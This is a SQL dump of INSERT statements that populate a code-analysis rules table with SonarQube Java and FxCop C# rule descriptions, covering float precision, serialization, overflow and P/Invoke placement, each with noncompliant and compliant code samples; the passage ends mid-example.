INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (734, 'Math should not be performed on floats', 'S2164', NULL, 'squid', '<p>For small numbers, <code>float</code> math has enough precision to yield the expected value, but for larger numbers, it does not.
<code>BigDecimal</code> is the best alternative, but if a primitive is required, use a <code>double</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float a = 16777216.0f;
float b = 1.0f;
float c = a + b; // Noncompliant; yields 1.6777216E7 not 1.6777217E7

double d = a + b; // Noncompliant; addition is still between 2 floats
</pre>
<h2>Compliant Solution</h2>
<pre>
float a = 16777216.0f;
float b = 1.0f;
BigDecimal c = BigDecimal.valueOf(a).add(BigDecimal.valueOf(b));

double d = (double)a + (double)b;
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise an issue when the mathematical expression is only used to build a string.</p>
<pre>
System.out.println("["+getName()+"] " +
           "\n\tMax time to retrieve connection:"+(max/1000f/1000f)+" ms.");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/DgU">CERT, FLP02-C.</a> - Avoid using floating-point numbers when precise computation
  is needed </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert', false, 'HTML', 1510817812731, 1510817812732, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (661, 'CA1820: Test for empty strings using string length', 'TestForEmptyStringsUsingStringLength', 'CA1820', 'fxcop', '<h2>Cause</h2>
<p>
            A string is compared to the empty string by using <code>Object.Equals</code>.
</p>
<h2>Rule Description</h2>
<p>
            Comparing strings using the <code>String.Length</code> property or the <code>String.IsNullOrEmpty</code> method is significantly faster than using <code>Equals</code>. This is because <code>Equals</code> executes significantly more MSIL instructions than either <code>IsNullOrEmpty</code> or the number of instructions executed to retrieve the <code>Length</code> property value and compare it to zero.
            You should be aware that <code>Equals</code> and <code>Length</code> == 0 behave differently for null strings. If you try to get the value of the <code>Length</code> property on a null string, the common language runtime throws a <code>System.NullReferenceException</code>. If you perform a comparison between a null string and the empty string, the common language runtime does not throw an exception; the comparison returns <code>false</code>. Testing for null does not significantly affect the relative performance of these two approaches. When targeting .NET Framework 2.0, use the <code>IsNullOrEmpty</code> method. Otherwise, use the <code>Length</code> == comparison whenever possible.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the comparison to use the <code>Length</code> property and test for the null string. If targeting .NET Framework 2.0, use the <code>IsNullOrEmpty</code> method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if performance is not an issue.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182279.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182279.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '15min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812626, 1510817812626, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (662, 'CA1043: Use integral or string argument for indexers', 'UseIntegralOrStringArgumentForIndexers', 'CA1043', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type contains a public or protected indexer that uses an index type other than System.Int32, System.Int64, <code>System.Object</code>, or <code>System.String</code>.
</p>
<h2>Rule Description</h2>
<p>
            Indexers, that is, indexed properties, should use integer or string types for the index. These types are typically used for indexing data structures and increase the usability of the library. Use of the <code>Object</code> type should be restricted to those cases where the specific integer or string type cannot be specified at design time. If the design requires other types for the index, reconsider whether the type represents a logical data store. If it does not represent a logical data store, use a method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the index to an integer or string type, or use a method instead of the indexer.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only after carefully considering the need for the nonstandard indexer.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:IndexersShouldNotBeMultidimensional}<br/>




                {rule:fxcop:UsePropertiesWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182180.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182180.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812627, 1510817812628, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (756, '"Externalizable" classes should have no-arguments constructors', 'S2060', NULL, 'squid', '<p>An <code>Externalizable</code> class is one which handles its own <code>Serialization</code> and deserialization. During deserialization, the first
step in the process is a default instantiation using the class'' no-argument constructor. Therefore an <code>Externalizable</code> class without a
no-arg constructor cannot be deserialized.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Tomato implements Externalizable {  // Noncompliant; no no-arg constructor

  public Tomato (String color, int weight) { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Tomato implements Externalizable {

  public Tomato() { ... }
  public Tomato (String color, int weight) { ... }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812760, 1510817812761, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (757, 'Ints and longs should not be shifted by zero or more than their number of bits-1', 'S2183', NULL, 'squid', '<p>Since an <code>int</code> is a 32-bit variable, shifting by more than +/-31 is confusing at best and an error at worst. Shifting an
<code>int</code> by 32 is the same as shifting it by 0, and shifting it by 33 is the same as shifting it by 1.</p>
<p>Similarly, shifting a <code>long</code> by +/-64 is the same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int shift(int a) {
  return a &lt;&lt; 48;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int shift(int a) {
  return a &lt;&lt; 16;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812761, 1510817812762, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (663, 'CA2235: Mark all non-serializable fields', 'MarkAllNonSerializableFields', 'CA2235', 'fxcop', '<h2>Cause</h2>
<p>
            An instance field of a type that is not serializable is declared in a type that is serializable.
</p>
<h2>Rule Description</h2>
<p>
            A serializable type is one that is marked with the <code>System.SerializableAttribute</code> attribute. When the type is serialized, a <code>System.Runtime.Serialization.SerializationException</code> exception is thrown if a type contains an instance field of a type that is not serializable.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, apply the <code>System.NonSerializedAttribute</code> attribute to the field that is not serializable.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Only suppress a warning from this rule if a <code>System.Runtime.Serialization.ISerializationSurrogate</code> type is declared that allows instances of the field to be serialized and deserialized.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>




                {rule:fxcop:ImplementISerializableCorrectly}<br/>




                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>




                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>




                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>




                {rule:fxcop:SecureSerializationConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182349.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182349.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812628, 1510817812629, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (664, 'CA2201: Do not raise reserved exception types', 'DoNotRaiseReservedExceptionTypes', 'CA2201', 'fxcop', '<h2>Cause</h2>
<p>
            A method raises an exception type that is too general or that is reserved by the runtime.
</p>
<h2>Rule Description</h2>
<p>
            The following exception types are too general to provide sufficient information to the user:
            <ul>
              <li>


                    <code>System.Exception</code>


              </li>
              <li>


                    <code>System.ApplicationException</code>


              </li>
              <li>


                    <code>System.SystemException</code>


              </li>
            </ul>
            The following exception types are reserved and should be thrown only by the common language runtime:
            <ul>
              <li>


                    <code>System.ExecutionEngineException</code>


              </li>
              <li>


                    <code>System.IndexOutOfRangeException</code>


              </li>
              <li>


                    <code>System.NullReferenceException</code>


              </li>
              <li>


                    <code>System.OutOfMemoryException</code>


              </li>
            </ul>

              Do Not Throw General Exceptions

            If you throw a general exception type, such as <code>Exception</code> or <code>SystemException</code> in a library or framework, it forces consumers to catch all exceptions, including unknown exceptions that they do not know how to handle.
            Instead, either throw a more derived type that already exists in the framework, or create your own type that derives from <code>Exception</code>.

              Throw Specific Exceptions

            The following table shows parameters and which exceptions to throw when you validate the parameter, including the value parameter in the set accessor of a property:







                    Parameter Description


                    Exception






                        <code>null</code>
                       reference 




                        <code>System.ArgumentNullException</code>






                    Outside the allowed range of values (such as an index for a collection or list)




                        <code>System.ArgumentOutOfRangeException</code>






                    Invalid <code>enum</code> value




                        <code>System.ComponentModel.InvalidEnumArgumentException</code>






                    Contains a format that does not meet the parameter specifications of a method (such as the format string for ToString(String))




                        <code>System.FormatException</code>






                    Otherwise invalid




                        <code>System.ArgumentException</code>






            When an operation is invalid for the current state of an object    throw <code>System.InvalidOperationException</code>
            When an operation is performed on an object that has been disposed    throw <code>System.ObjectDisposedException</code>
            When an operation is not supported (such as in an overridden Stream.Write in a Stream opened for reading)    throw <code>System.NotSupportedException</code>
            When a conversion would result in an overflow (such as in a explicit cast operator overload)    throw <code>System.OverflowException</code>
            For all other situations, consider creating your own type that derives from <code>Exception</code> and throw that.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the type of the thrown exception to a specific type that is not one of the reserved types.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DoNotCatchGeneralExceptionTypes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182338.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182338.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812629, 1510817812630, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (901, 'Sections of code should not be "commented out"', 'CommentedOutCodeLine', 'S125', 'squid', '<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be "commented out". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out" </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra,unused', false, 'HTML', 1510817812937, 1510817812937, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (902, 'Files should contain only one top-level class or interface each', 'S1996', NULL, 'squid', '<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This
is doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or
interface per file.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'per extra type', NULL, 'brain-overload', false, 'HTML', 1510817812938, 1510817812938, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (903, 'Number patterns should be regular', 'S3937', NULL, 'squid', '<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus
1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>
<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int duos = 1_00_00;
int million = 1_000_00_000;  // Noncompliant
int thousand = 1000;
int tenThousand = 100_00;  // Noncompliant
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812939, 1510817812939, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (665, 'CA2233: Operations should not overflow', 'OperationsShouldNotOverflow', 'CA2233', 'fxcop', '<h2>Cause</h2>
<p>
            A method performs an arithmetic operation and does not validate the operands beforehand to prevent overflow.
</p>
<h2>Rule Description</h2>
<p>
            Arithmetic operations should not be performed without first validating the operands to make sure that the result of the operation is not outside the range of possible values for the data types involved. Depending on the execution context and the data types involved, arithmetic overflow can result in either a <code>System.OverflowException</code> or the most significant bits of the result discarded.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, validate the operands before you perform the operation.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the possible values of the operands will never cause the arithmetic operation to overflow.
</p>
<h2>Example of a Violation</h2>

<h3>Description</h3>
<p>
                A method in the following example manipulates an integer that violates this rule. Visual Basic requires the Remove integer overflow option to be disabled for this to fire.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public static class Calculator
    {
        public static int Decrement(int input)
        {
            // Violates this rule
            input--;
            return input;
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                If the method in this example is passed MinValue, the operation would underflow. This causes the most significant bit of the result to be discarded. The following code shows how this occurs.
                [C#]









            <pre>
public static void Main()
{
    int value = int.MinValue;    // int.MinValue is -2147483648
    value = Calculator.Decrement(value);
    Console.WriteLine(value);
}
</pre>




[VB]









            <pre>
Public Shared Sub Main()
    Dim value = Integer.MinValue    '' Integer.MinValue is -2147483648
    value = Calculator.Decrement(value)
    Console.WriteLine(value)
End Sub
</pre>











                    Output





</p>
<h2>Fix with Input Parameter Validation</h2>

<h3>Description</h3>
<p>
                The following example fixes the previous violation by validating the value of input.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public static class Calculator
    {
        public static int Decrement(int input)
        {
            if (input == int.MinValue)
                throw new ArgumentOutOfRangeException("input", "input must be greater than Int32.MinValue");

            input--;
            return input;
        }
    }
}
</pre>





</p>
<h2>Fix with a Checked Block</h2>

<h3>Description</h3>
<p>
                The following example fixes the previous violation by wrapping the operation in a checked block. If the operation causes an overflow, a <code>System.OverflowException</code> will be thrown.
                Note that checked blocks are not supported in Visual Basic.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public static class Calculator
    {
        public static int Decrement(int input)
        {
            checked
            {
                input--;
            }

            return input;
        }
    }
}
</pre>





</p>
<h2>Turn on Checked Arithmetic Overflow/Underflow</h2>
<p>
            If you turn on checked arithmetic overflow/underflow in C#, it is equivalent to wrapping every integer operation in a checked block.

              To turn on checked arithmetic overflow/underflow in C#


              <li>
                In Solution Explorer, right-click your project and choose Properties.
              </li>
              <li>
                Select the Build tab and click Advanced.
              </li>
              <li>
                Select Check for arithmetic overflow/underflow and click OK.
              </li>

</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182354.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182354.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812631, 1510817812631, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (666, 'CA2239: Provide deserialization methods for optional fields', 'ProvideDeserializationMethodsForOptionalFields', 'CA2239', 'fxcop', '<h2>Cause</h2>
<p>
            A type has a field that is marked with the <code>System.Runtime.Serialization.OptionalFieldAttribute</code> attribute and the type does not provide de-serialization event handling methods.
</p>
<h2>Rule Description</h2>
<p>
            The <code>OptionalFieldAttribute</code> attribute has no effect on serialization; a field marked with the attribute is serialized. However, the field is ignored on de-serialization and retains the default value associated with its type. De-serialization event handlers should be declared to set the field during the de-serialization process.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add de-serialization event handling methods to the type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the field should be ignored during the de-serialization process.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>




                {rule:fxcop:ImplementISerializableCorrectly}<br/>




                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>




                {rule:fxcop:MarkAllNonSerializableFields}<br/>




                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>




                {rule:fxcop:SecureSerializationConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182362.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182362.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812632, 1510817812633, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (667, 'CA1700: Do not name enum values ''Reserved''', 'DoNotNameEnumValuesReserved', 'CA1700', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an enumeration member contains the word "reserved".
</p>
<h2>Rule Description</h2>
<p>
            This rule assumes that an enumeration member that has a name that contains "reserved" is not currently used but is a placeholder to be renamed or removed in a future version. Renaming or removing a member is a breaking change. You should not expect users to ignore a member just because its name contains "reserved", nor can you rely on users to read or abide by documentation. Furthermore, because reserved members appear in object browsers and smart integrated development environments, they can cause confusion about which members are actually being used.
            Instead of using a reserved member, add a new member to the enumeration in the future version. In most cases the addition of the new member is not a breaking change, as long as the addition does not cause the values of the original members to change.



            In a limited number of cases the addition of a member is a breaking change even when the original members retain their original values. Primarily, the new member cannot be returned from existing code paths without breaking callers that use a <code>switch</code> (<code>Select</code> in Visual Basic) statement on the return value that encompasses the whole member list and that throw an exception in the default case. A secondary concern is that client code might not handle the change in behavior from reflection methods such as <code>Enum.IsDefined</code>. Accordingly, if the new member has to be returned from existing methods or a known application incompatibility occurs because of poor reflection usage, the only nonbreaking solution is to:

              <li>
                Add a new enumeration that contains the original and new members.
              </li>
              <li>
                Mark the original enumeration with the <code>System.ObsoleteAttribute</code> attribute.
              </li>

             Follow the same procedure for any externally visible types or members that expose the original enumeration.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove or rename the member.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule for a member that is currently used or for libraries that have previously shipped.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DoNotMarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotPrefixEnumValuesWithTypeName}<br/>




                {rule:fxcop:EnumStorageShouldBeInt32}<br/>




                {rule:fxcop:EnumsShouldHaveZeroValue}<br/>




                {rule:fxcop:MarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182236.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182236.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812634, 1510817812634, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (668, 'CA2004: Remove calls to GC.KeepAlive', 'RemoveCallsToGCKeepAlive', 'CA2004', 'fxcop', '<h2>Cause</h2>
<p>
            Classes use <code>SafeHandle</code> but still contain calls to <code>GC.KeepAlive</code>.
</p>
<h2>Rule Description</h2>
<p>
            If you are converting to <code>SafeHandle</code> usage, remove all calls to <code>GC.KeepAlive </code>(object). In this case, classes should not have to call <code>GC.KeepAlive</code>,<code> </code>assuming they do not have a finalizer but rely on <code>SafeHandle</code> to complete the OS handle for them.  Although the cost of leaving in a call to <code>GC.KeepAlive</code> might be negligible as measured by performance, the perception that a call to <code>GC.KeepAlive</code> is either necessary or sufficient to solve a lifetime issue that might no longer exist makes the code harder to maintain.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove calls to <code>GC.KeepAlive</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You can suppress this warning only if it is not technically correct to convert to <code>SafeHandle</code> usage in your class.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182293.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182293.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812635, 1510817812635, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (669, 'CA1060: Move P/Invokes to NativeMethods class', 'MovePInvokesToNativeMethodsClass', 'CA1060', 'fxcop', '<h2>Cause</h2>
<p>
            A method uses Platform Invocation Services to access unmanaged code and is not a member of one of the NativeMethods classes.
</p>
<h2>Rule Description</h2>
<p>
            Platform Invocation methods, such as those that are marked by using the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute, or methods that are defined by using the <code>Declare</code> keyword in Visual Basic, access unmanaged code. These methods should be in one of the following classes:
            <ul>
              <li>

                  NativeMethods - This class does not suppress stack walks for unmanaged code permission. (<code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> must not be applied to this class.) This class is for methods that can be used anywhere because a stack walk will be performed.
              </li>
              <li>

                  SafeNativeMethods - This class suppresses stack walks for unmanaged code permission. (<code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> is applied to this class.) This class is for methods that are safe for anyone to call. Callers of these methods are not required to perform a full security review to make sure that the usage is secure because the methods are harmless for any caller.
              </li>
              <li>

                  UnsafeNativeMethods - This class suppresses stack walks for unmanaged code permission. (<code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> is applied to this class.) This class is for methods that are potentially dangerous. Any caller of these methods must perform a full security review to make sure that the usage is secure because no stack walk will be performed.
              </li>
            </ul>
            These classes are declared as <code>internal</code> (<code>Friend</code>, in Visual Basic) and declare a private constructor to prevent new instances from being created. The methods in these classes should be <code>static</code> and <code>internal</code> (<code>Shared</code> and <code>Friend</code> in Visual Basic).
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, move the method to the appropriate NativeMethods class. For most applications, moving P/Invokes to a new class that is named NativeMethods is enough.
            However, if you are developing libraries for use in other applications, you should consider defining two other classes that are called SafeNativeMethods and UnsafeNativeMethods. These classes resemble the NativeMethods class; however, they are marked by using a special attribute called SuppressUnmanagedCodeSecurityAttribute. When this attribute is applied, the runtime does not perform a full stack walk to make sure that all callers have the UnmanagedCode permission. The runtime ordinarily checks for this permission at startup. Because the check is not performed, it can greatly improve performance for calls to these unmanaged methods, It also enables code that has limited permissions to call these methods.
            However, you should use this attribute with great care. It can have serious security implications if it is implemented incorrectly..
            For information about how to implement the methods, see the NativeMethods Example, SafeNativeMethods Example, and UnsafeNativeMethods Example.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>

<h3>Description</h3>
<p>
                Because the NativeMethods class should not be marked by using SuppressUnmanagedCodeSecurityAttribute, P/Invokes that are put in it will require UnmanagedCode permission. Because most applications run from the local computer and run together with full trust, this is usually not a problem. However, if you are developing reusable libraries, you should consider defining a SafeNativeMethods or UnsafeNativeMethods class.
                The following example shows an Interaction.Beep method that wraps the MessageBeep function from user32.dll. The MessageBeep P/Invoke is put in the NativeMethods class.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public static class Interaction
{
    // Callers require Unmanaged permission         
    public static void Beep()
    {
        // No need to demand a permission as callers of Interaction.Beep             
        // will require UnmanagedCode permission             
        if (!NativeMethods.MessageBeep(-1))
            throw new Win32Exception();
    }
}

internal static class NativeMethods
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool MessageBeep(int uType);
}
</pre>





</p>
<h2>SafeNativeMethods Example</h2>

<h3>Description</h3>
<p>
                P/Invoke methods that can be safely exposed to any application and that do not have any side effects should be put in a class that is named SafeNativeMethods. You do not have to demand permissions and you do not have to pay much attention to where they are called from.
                The following example shows an Environment.TickCount property that wraps the GetTickCount function from kernel32.dll.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.Security;

public static class Environment
{
    // Callers do not require UnmanagedCode permission        
    public static int TickCount
    {
        get
        {
            // No need to demand a permission in place of                
